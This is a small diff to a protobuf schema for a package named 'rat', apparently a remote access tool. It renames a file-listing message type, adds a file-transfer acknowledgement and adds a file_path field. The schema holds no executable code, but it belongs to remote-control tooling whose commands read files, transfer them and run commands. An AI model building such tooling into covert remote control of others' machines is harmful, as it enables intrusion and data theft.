@@ -5,7 +5,7 @@ package rat;
 message Packet {
   enum Type {
     UNKNOWN = 0;
-    LIST_FILES = 1;
+    LIST_FILES_FOLDERS = 1;
     READ_FILE = 2;
     TRANSFER_FILE = 3;
     LIST_PROCESSES = 4;
@@ -16,6 +16,7 @@ message Packet {
     ERROR = 9;
     COMMAND = 10;
     STATIC_ID = 11;
+    TRANSFER_FILE_ACK = 12;
   }
 
   Type type = 1;
@@ -23,8 +24,8 @@ message Packet {
   string source_id = 3;
   string destination_id = 4;
   bool encrypted = 5;
-
-  ChunkedData chunked_data = 6;
+  bytes file_path = 6;
+  ChunkedData chunked_data = 7;
 }
 
 message ChunkedData {
